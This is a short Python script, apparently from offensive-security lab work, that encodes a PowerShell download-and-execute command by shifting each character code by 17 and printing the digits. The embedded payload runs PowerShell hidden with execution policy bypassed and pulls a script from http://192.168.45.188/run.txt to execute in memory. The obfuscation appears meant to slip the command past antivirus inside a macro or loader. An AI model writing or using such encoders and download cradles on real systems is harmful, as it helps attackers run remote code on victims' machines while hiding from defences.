#!/usr/bin/python3

payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.188/run.txt'))"

def main():
    for i in range (0, len(payload)):
        num = ord(payload[i])
        num += 17
        print("%03d" % (num,), end='')

    print ("\n")

    return

if __name__ == "__main__":
    main()